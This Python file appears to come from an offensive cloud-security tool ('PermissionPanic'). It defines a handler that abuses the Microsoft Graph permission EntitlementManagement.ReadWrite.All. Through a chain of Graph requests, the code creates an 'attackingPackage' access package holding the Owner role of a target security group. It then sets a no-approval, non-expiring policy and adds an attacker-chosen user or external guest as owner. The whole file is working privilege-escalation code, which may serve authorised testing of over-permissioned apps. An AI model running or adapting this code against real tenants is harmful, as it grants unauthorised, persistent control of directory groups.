from typing import List
from attacks.handlers.base_handler import AttackHandler, Request, Response
from utils import logger
import requests

logger = logger.createLogger('attacks.handlers.entitlement_handler')


class Entitlementntitlement_Handler(AttackHandler):
    def handle(self, request: Request,responses:List[Response]): # the group must be a in the catalog
        # TODO map request.roles to fit with this attack
        if "EntitlementManagement.ReadWrite.All" in request.roles:
            logger.info('tid: %s, appid: %s may be vulnerable to entitlement_management_rw_all vector' % (request.tenantId,request.appId))
            status = False
            attack_name = "EntitlementManagementRWVectors"
            message = ""
            error = "EntitlementManagementRWVectors - failed"
            conf = request.attack_config['Entitlement']
            
            logger.debug("EntitlementManagement.ReadWrite.All - Allows the app to read and write access packages and related entitlement management resources without a signed-in user.")

            logger.debug("Attack vector - privilege escalation.")         
            try:
                
                create_message_URL = "https://graph.microsoft.com/beta/identityGovernance/entitlementManagement/accessPackageCatalogs?$filter=(displayName eq 'General')"
                result = requests.get(create_message_URL, headers=request.request_headers)
                json = result.json()
                val = json["value"]
                catalogId = val[0]
                catalogId = catalogId["id"]

                create_message_URL = "https://graph.microsoft.com/beta/identityGovernance/entitlementManagement/accessPackageCatalogs/" + catalogId + "/accessPackageResources?$filter=(displayName+eq+%27" + \
                                    conf["CatalogResourceName"] + "%27)&$select=id"

                result = requests.get(create_message_URL, headers=request.request_headers)
                CatalogResourceId = result.json()
                CatalogResourceId = CatalogResourceId["value"]
                if len(CatalogResourceId) > 0:
                    CatalogResourceId = CatalogResourceId[0]
                    CatalogResourceId = CatalogResourceId["id"]

                    create_message_URL = "https://graph.microsoft.com/beta/identityGovernance/entitlementManagement/accessPackages/"

                    message_obj = {
                        "catalogId": catalogId,
                        "displayName": "attackingPackage",
                        "description": "created by PermissionPanic"
                    }
                    result = requests.post(create_message_URL, json=message_obj, headers=request.request_headers)

                    if result.status_code == 201:
                        json = result.json()
                        accessPackageID = json["id"]
                        create_message_URL = "https://graph.microsoft.com/beta/identityGovernance/entitlementManagement/accessPackages/" + accessPackageID + "/accessPackageResourceRoleScopes"

                        message_obj = {
                            "accessPackageResourceRole": {
                                "originId": "Owner_" + conf["resourceId"],
                                "displayName": "Owner",
                                "originSystem": "AadGroup",
                                "accessPackageResource": {
                                    "id": CatalogResourceId, "resourceType": "Security Group",
                                    "originId": conf["resourceId"], "originSystem": "AadGroup"
                                }
                            },
                            "accessPackageResourceScope": {
                                "originId": conf["resourceId"], "originSystem": "AadGroup"
                            }
                        }

                        result = requests.post(create_message_URL, json=message_obj, headers=request.request_headers)
                        if result.status_code == 201:  # created access package

                            create_message_URL = "https://graph.microsoft.com/beta/identityGovernance/entitlementManagement/accessPackageAssignmentPolicies"

                            message_obj = {"displayName": "kjhk", "description": "ik", "accessPackageId": accessPackageID,
                                        "expiration": {"type": "noExpiration"}, "canExtend": "false",
                                        "requestApprovalSettings": {
                                            "isApprovalRequired": "false",
                                            "isApprovalRequiredForExtension": "false",
                                            "isRequestorJustificationRequired": "false",
                                            "approvalMode": "NoApproval",
                                            "approvalStages": []
                                        }
                                , "requestorSettings": {"acceptRequests": "true",
                                                                                                    "scopeType": "AllExistingDirectorySubjects",
                                                                                                    "allowedRequestors": [],
                                                                                                    "isOnBehalfAllowed": "false",
                                                                                                    "onBehalfRequestors": []},
                                        "isCustomAssignmentScheduleAllowed": "false",
                                        "notificationSettings": "null",
                                        "verifiableCredentialSettings": {"credentialTypes": []}, "questions": [],
                                        "customExtensionHandlers": []}
                            result = requests.post(create_message_URL, json=message_obj, headers=request.request_headers)
                            json = result.json()
                            policyId = json["id"]

                            if result.status_code == 201:

                                create_message_URL = "https://graph.microsoft.com/beta/identityGovernance/entitlementManagement/accessPackageAssignmentRequests"

                                if conf["isExternalUser"] == "true":
                                    message_obj = {"accessPackageAssignment": {"id": "", "target": {
                                        "displayName": "attacker guest", "email": conf["userId"]}, "schedule": {
                                        "startDateTime": "2024-03-21T15:58:37.478Z"}, "assignmentPolicyId": policyId,
                                                                            "accessPackageId": accessPackageID}, "id": "",
                                                "requestStatus": "", "requestType": "AdminAdd", "parameters": [],
                                                "answers": []}
                                else:
                                    message_obj = {"accessPackageAssignment":{"id":"","target":{"objectId":conf["userId"],"type":"User"},"schedule":{"startDateTime":"2024-03-21T15:58:37.478Z"},"assignmentPolicyId":policyId,"accessPackageId":accessPackageID},"id":"","requestStatus":"","requestType":"AdminAdd","parameters":[],"answers":[]}
                                result = requests.post(create_message_URL, json=message_obj, headers=request.request_headers) # the user may be in the requests tab even though we can see him in the owners of the group.
                                if result.status_code == 200:
                                    message += "Added %s to %s \n" % (conf["userId"], conf["CatalogResourceName"])
                                    status = True
                if message == "":
                        message = error
            except:
                logger.error("Unexpected exception in Entitlement_Handler function")
            responses.append(Response(attack_name,request.tenantId,request.appId,status,message))  
            
        return super().handle(request,responses)
